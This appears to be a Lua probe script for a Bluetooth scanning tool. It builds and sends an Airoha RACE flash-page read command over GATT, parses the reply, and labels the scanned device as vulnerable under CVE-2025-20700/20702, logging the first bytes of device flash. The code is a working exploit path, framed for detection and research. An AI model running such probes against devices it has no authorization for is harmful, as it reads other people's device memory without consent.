-- RACE minimal flash read probe. Ref: race-toolkit ReadFlashPage / ReadFlashPageResponse.
-- Manifest supplies vars.svc / vars.tx / vars.rx as keys into uuids (see manifest central.scripts[].vars).
-- Request: head 0x05, type 0x5A, len per packets.py, cmd 0x0403, payload [storage=0][size_hi=1][addr le u32].
-- Response: type 0x5B, cmd 0x0403, body = 8-byte preamble + 0x100 page; on-wire body = header.length - 2.
-- On success, the device's Airoha vendor debug path over GATT is live for flash-style reads (see CVE-2025-20700 / CVE-2025-20702 research in device manifest).

local RACE_CMD_PAGE_READ = 0x0403
local RACE_TYPE_RSP = 0x5B

local RACE_FLASH_TITLE_SUFFIX = " · Airoha flash vulnerability confirmed"

local function u16le(n)
  return string.char(n % 256, math.floor(n / 256) % 256)
end

local function u32le(n)
  return string.char(
    n % 256,
    math.floor(n / 256) % 256,
    math.floor(n / 65536) % 256,
    math.floor(n / 16777216) % 256
  )
end

local function build_read_flash_packet(addr)
  local storage = string.char(0)
  local size_hi = string.char(1)
  local payload = storage .. size_hi .. u32le(addr)
  local hlen = #payload + 2
  local hdr = string.char(0x05, 0x5A) .. u16le(hlen) .. u16le(RACE_CMD_PAGE_READ)
  return hdr .. payload
end

local function parse_flash_rsp(hex_data)
  if not hex_data or hex_data == "" then
    return false, nil, "empty notification"
  end
  local b = hex_to_bin(hex_data)
  if not b or #b < 6 then
    return false, nil, "packet too short"
  end
  local typ = string.byte(b, 2)
  local len_lo = string.byte(b, 3)
  local len_hi = string.byte(b, 4)
  local len_field = len_lo + len_hi * 256
  local cmd_lo = string.byte(b, 5)
  local cmd_hi = string.byte(b, 6)
  local cmd = cmd_lo + cmd_hi * 256
  if typ ~= RACE_TYPE_RSP then
    return false, nil, string.format("expected RESPONSE 0x5B got 0x%02x", typ)
  end
  if cmd ~= RACE_CMD_PAGE_READ then
    return false, nil, string.format("expected cmd 0x403 got 0x%x", cmd)
  end
  local body_len = len_field - 2
  if body_len < 0 or #b < 6 + body_len then
    return false, nil, "length field mismatch"
  end
  local body = string.sub(b, 7, 6 + body_len)
  if #body < 8 then
    return false, nil, "response body too short"
  end
  local ret = string.byte(body, 1)
  if ret ~= 0 then
    return false, nil, string.format("return_code=%d", ret)
  end
  local page = string.sub(body, 9, math.min(#body, 8 + 0x100))
  return true, page, nil
end

local function scan_row_base_title()
  local b = fp_get("enrichment_display_name")
  if b and b ~= "" then
    return b
  end
  b = fp_get("display_name")
  if b and b ~= "" then
    return b
  end
  return gatt_address()
end

--- Marks the scan row when the probe proves the RACE flash read path responds (Airoha vendor debug over GATT).
local function apply_race_confirmed_title()
  local base = scan_row_base_title()
  if base:find("Airoha flash vulnerability confirmed", 1, true) then
    fp_set("enrichment_display_name", base)
    return
  end
  fp_set("enrichment_display_name", base .. RACE_FLASH_TITLE_SUFFIX)
end

local function fp_race_probe(attrs)
  fp_append("airoha_race_flash_probe", attrs, "Check Airoha vulnerability: flash read")
end

function run()
  if type(uuids) ~= "table" then
    log("RESULT: FAIL — uuids global missing (open script from Airoha device pack).")
    fp_race_probe({
      race_flash_verdict = "config_error",
      race_vulnerability_path_confirmed = false,
      race_error = "uuids_missing",
      race_variant = "",
      race_page_preview_hex = "",
      gatt_mac = gatt_address(),
    })
    return
  end
  if type(vars) ~= "table" then
    log("RESULT: FAIL — vars missing (manifest central.scripts[].vars).")
    fp_race_probe({
      race_flash_verdict = "config_error",
      race_vulnerability_path_confirmed = false,
      race_error = "vars_missing",
      race_variant = "",
      race_page_preview_hex = "",
      gatt_mac = gatt_address(),
    })
    return
  end
  local sk = vars.svc
  local tk = vars.tx
  local rk = vars.rx
  if not sk or sk == "" or not tk or tk == "" or not rk or rk == "" then
    log("RESULT: FAIL — vars.svc, vars.tx, vars.rx required.")
    fp_race_probe({
      race_flash_verdict = "config_error",
      race_vulnerability_path_confirmed = false,
      race_error = "vars_incomplete",
      race_variant = tostring(vars.variant or ""),
      race_page_preview_hex = "",
      gatt_mac = gatt_address(),
    })
    return
  end
  local SVC = uuids[sk]
  local TX = uuids[tk]
  local RX = uuids[rk]
  if not SVC or not TX or not RX then
    log(
      "RESULT: FAIL — uuids.json missing keys "
        .. tostring(sk)
        .. " / "
        .. tostring(tk)
        .. " / "
        .. tostring(rk)
        .. "."
    )
    fp_race_probe({
      race_flash_verdict = "config_error",
      race_vulnerability_path_confirmed = false,
      race_error = "uuid_keys_missing",
      race_variant = tostring(vars.variant or ""),
      race_page_preview_hex = "",
      gatt_mac = gatt_address(),
    })
    return
  end
  local label = vars.variant or sk
  if not ble_subscribe(SVC, RX) then
    log(
      "RESULT: FAIL — could not enable NOTIFY on RACE RX (check Client Characteristic Configuration / subscription). variant "
        .. tostring(label)
        .. "."
    )
    fp_race_probe({
      race_flash_verdict = "ble_subscribe_failed",
      race_vulnerability_path_confirmed = false,
      race_variant = tostring(label),
      race_page_preview_hex = "",
      gatt_mac = gatt_address(),
    })
    return
  end
  delay_ms(80)
  local req_hex = bin_to_hex(build_read_flash_packet(0))
  start_notify_wait(SVC, RX, 180)
  if not ble_write(SVC, TX, req_hex, true) then
    log("RESULT: FAIL — RACE TX write did not complete (" .. tostring(label) .. ").")
    fp_race_probe({
      race_flash_verdict = "write_failed",
      race_vulnerability_path_confirmed = false,
      race_variant = tostring(label),
      race_page_preview_hex = "",
      gatt_mac = gatt_address(),
    })
    return
  end
  local rsp = finish_notify_wait(SVC, RX, 12000)
  local ok, page, err = parse_flash_rsp(rsp)
  if not ok then
    log(
      "RESULT: FAIL — RACE response not a valid flash read ("
        .. tostring(label)
        .. "): "
        .. (err or "?")
    )
    fp_race_probe({
      race_flash_verdict = "response_invalid",
      race_vulnerability_path_confirmed = false,
      race_response_error = err or "",
      race_variant = tostring(label),
      race_page_preview_hex = "",
      gatt_mac = gatt_address(),
    })
    return
  end
  local peek = ""
  if page and #page > 0 then
    peek = bin_to_hex(string.sub(page, 1, math.min(16, #page)))
  end
  log(
    "RESULT: PASS — Airoha RACE flash read confirmed (CVE-2025-20700 / CVE-2025-20702 class vendor debug path is live, variant "
      .. tostring(label)
      .. ")."
  )
  log("race_flash (" .. tostring(label) .. "): return_code=0 page_prefix_hex=" .. peek)
  apply_race_confirmed_title()
  fp_race_probe({
    race_flash_verdict = "vulnerability_path_confirmed",
    race_vulnerability_path_confirmed = true,
    race_variant = tostring(label),
    race_page_preview_hex = peek,
    research_ref = "CVE-2025-20700 CVE-2025-20702",
    gatt_mac = gatt_address(),
  })
end
